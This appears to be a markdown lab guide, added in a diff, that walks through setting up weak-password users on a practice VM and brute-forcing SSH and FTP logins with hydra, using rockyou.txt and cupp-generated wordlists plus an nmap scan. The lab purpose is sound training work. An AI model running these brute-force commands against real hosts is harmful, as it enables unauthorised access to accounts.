@@ -1,0 +1,173 @@
+# HYDRA - Brute Force Tool --> Practical Overview
+
+**Objective:**
+
+- Set up **5 users** with simple passwords on a target Debian/Ubuntu VM.
+- Connect attacker VM (Kali Linux) via **SSH**.
+- Use **Hydra** to brute-force SSH logins.
+- Use **`cupp`** to generate custom wordlists.
+- Use **prebuilt wordlists** like `rockyou.txt`.
+
+---
+
+## 🔹 **Step 1: Target VM Setup (Debian/Ubuntu)**
+
+**1️⃣ Create 5 users with passwords**
+
+```bash
+sudo adduser user1
+# Enter password: admin@123
+
+sudo adduser user2
+# Enter password: admin@1234
+
+sudo adduser user3
+# Enter password: admin@12345
+
+sudo adduser user4
+# Enter password: admin@123456
+
+sudo adduser user5
+# Enter password: admin@1234567
+```
+
+**2️⃣ Confirm SSH is running**
+
+```bash
+sudo systemctl status ssh
+# If not installed:
+sudo apt update
+sudo apt install openssh-server
+sudo systemctl start ssh
+sudo systemctl enable ssh
+```
+
+**3️⃣ Find Target IP**
+
+```bash
+ip a
+# Example: 192.168.100.10
+```
+
+---
+
+## 🔹 **Step 2: Attacker VM Setup (Kali Linux)**
+
+### ✔️ Create `users.txt` and `passwords.txt`
+
+```bash
+echo -e "user1\nuser2\nuser3\nuser4\nuser5" > users.txt
+echo -e "admin@123\nadmin@1234\nadmin@12345\nadmin@123456\nadmin@1234567" > passwords.txt
+```
+
+**Check files:**
+
+```bash
+cat users.txt
+cat passwords.txt
+```
+
+---
+
+## 🔹 **Step 3: Run Hydra to Brute-Force SSH**
+
+```bash
+sudo -s   # Switch to root if needed
+hydra -L users.txt -P passwords.txt ssh://192.168.100.10
+```
+
+✅ **Expected Output:** Hydra will test all combinations and show valid username\:password pairs.
+
+---
+
+## 🔹 **Step 4: Download Real Wordlists (rockyou.txt)**
+
+```bash
+# rockyou.txt is often already in Kali
+ls /usr/share/wordlists/
+
+# If not, extract it:
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+# OR download from GitHub:
+cd ~
+git clone https://github.com/brannondorsey/naive-hashcat
+cd naive-hashcat
+ls
+```
+
+---
+
+## 🔹 **Step 5: Use `cupp` to Create Custom Wordlists**
+
+```bash
+sudo apt update
+sudo apt install cupp
+
+# Run cupp interactive:
+cupp -i
+
+# Example questions:
+# Name: admin
+# Birthdate: 123
+# Pet name: admin
+# -> Will generate a wordlist.txt with permutations.
+
+# You can check:
+ls
+cat admin.txt
+```
+
+---
+
+## 🔹 **Step 6: Restart FTP (Optional)**
+
+If testing FTP instead of SSH:
+
+```bash
+sudo apt install vsftpd
+sudo systemctl restart vsftpd
+sudo ufw allow 21/tcp  # Allow FTP port
+```
+
+**Run Hydra for FTP:**
+
+```bash
+hydra -L users.txt -P passwords.txt ftp://192.168.100.10
+```
+
+---
+
+## ✅ **Bonus Tips**
+
+✔️ **Useful Hydra syntax:**
+
+```
+hydra -L users.txt -P passwords.txt ssh://<IP>
+hydra -l user1 -P rockyou.txt ssh://<IP>
+```
+
+✔️ **Check open ports:**
+
+```bash
+nmap -sV 192.168.100.10
+```
+
+✔️ **Location of default wordlists:**
+
+```bash
+cd /usr/share/wordlists/
+ls
+```
+
+---
+
+## 🔒 **Practical Outcome**
+
+👉 You demonstrated how to:
+
+- Set up target users.
+- Run brute-force attacks on SSH/FTP.
+- Use built-in and custom wordlists.
+
+---
